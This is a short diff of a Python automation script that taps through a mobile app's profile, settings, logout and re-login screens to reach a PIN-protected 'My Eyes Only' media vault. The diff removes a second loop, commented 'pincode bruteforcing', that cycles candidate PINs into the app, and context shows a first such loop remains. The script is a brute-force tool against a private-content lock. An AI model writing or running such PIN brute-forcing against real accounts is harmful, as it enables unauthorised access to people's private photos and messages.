@@ -143,29 +143,27 @@ for x in range(attempts, max_attempts):
 
 monley_pressbutton(btn_exit_memories)
 time.sleep(5)
+
 monley_pressbutton(btn_profile)
 time.sleep(5)
+
 monley_pressbutton(btn_settings)
 time.sleep(5)
+
 monley_swipeup(3)
+
 monley_pressbutton(btn_logout)
 time.sleep(5)
+
 monley_pressbutton(btn_logout_confirm)
 time.sleep(5)
+
 monley_pressbutton(btn_log_in_as)
 time.sleep(5)
+
 monley_pressbutton(btn_memories)
 time.sleep(5)
+
 monley_pressbutton(btn_my_eyes_only)
 time.sleep(5)
-
-# the second wae of pincode bruteforcing
-attempts = 0
-
-for x in range(attempts, max_attempts):
-    print ("PIN: " + pincodes[pincode_index])
-    
-    if not args.simulate:
-        monley_inputpin(pincodes[pincode_index])
-        time.sleep(1)
 
